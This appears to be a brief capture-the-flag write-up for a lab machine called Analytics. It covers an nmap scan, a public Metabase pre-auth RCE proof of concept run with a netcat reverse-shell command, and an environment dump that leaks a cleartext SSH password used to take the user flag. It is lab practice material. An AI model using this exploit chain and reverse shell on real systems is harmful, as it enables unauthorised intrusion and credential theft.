# Nmap
```bash
Nmap scan report for 10.10.11.233
Host is up, received user-set (0.016s latency).
Scanned at 2024-02-16 14:56:05 +08 for 42s
Not shown: 65280 closed tcp ports (reset), 253 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
```

# Metabase Exploit
PoC: https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/main/main.py
```bash
python main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'nc 10.10.14.7 1234 -e /bin/bash'
[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]

[+] Initialized script
[+] Encoding command
[+] Making request
[+] Payload sent

rlwrap nc -lnvp 1234    
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.233] 34703
whoami
metabase

env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=ebb76f73da1e
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/app
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
[...SNIP...]
```

# User Flag
```bash
ssh metalytics@10.10.11.233
metalytics@analytics:~$ ls -la /home/metalytics
total 40
drwxr-x--- 5 metalytics metalytics 4096 Feb 16 06:23 .
drwxr-xr-x 3 root       root       4096 Aug  8  2023 ..
lrwxrwxrwx 1 root       root          9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 metalytics metalytics  220 Aug  3  2023 .bash_logout
-rw-r--r-- 1 metalytics metalytics 3771 Aug  3  2023 .bashrc
drwx------ 2 metalytics metalytics 4096 Aug  8  2023 .cache
drwx------ 3 metalytics metalytics 4096 Feb 16 06:23 .gnupg
drwxrwxr-x 3 metalytics metalytics 4096 Aug  8  2023 .local
-rw-r--r-- 1 metalytics metalytics  807 Aug  3  2023 .profile
-rw-r----- 1 root       metalytics   33 Feb 16 05:26 user.txt
-rw-r--r-- 1 metalytics metalytics   39 Aug  8  2023 .vimrc
```

# Root Flag
Got spoiled with a bash with suid set in /tmp. Not continuing.
